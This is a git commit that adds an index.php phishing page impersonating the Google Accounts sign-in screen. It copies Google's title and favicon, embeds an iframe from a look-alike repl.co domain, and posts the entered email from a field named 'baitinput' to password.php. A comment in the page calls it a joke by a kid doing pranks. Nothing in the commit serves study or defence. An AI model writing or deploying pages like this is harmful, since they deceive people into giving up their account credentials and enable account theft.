91b1035b4b53f5737d281f3ac02df69f535e78f1
patrickzhou1234 <83720283+patrickzhou1234@users.noreply.github.com>
2021-08-21 14:24:06 -0700

    Create index.php

---
+++ index.php
@@ -0,0 +1,17 @@
+<html>
+  <head>
+    <title>Sign in - Google Accounts</title>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width">
+    <link href="style.css" rel="stylesheet" type="text/css" />
+    <link rel="shortcut icon" type="image/jpg" href="https://www.google.com/favicon.ico"/>
+  </head>
+  <body>
+    <iframe id="embededpage" src="https://signininterface.googleaccounts.repl.co"></iframe>
+    <form  method="post" action="password.php">
+      <input name="email" type="text" id="baitinput" placeholder="Email or phone" autofocus></input>
+    </form>
+    <!-- THIS is a joke - Disclaimer. I am a kid just trying to do pranks-->
+    <script src="script.js"></script>
+  </body>
+</html>
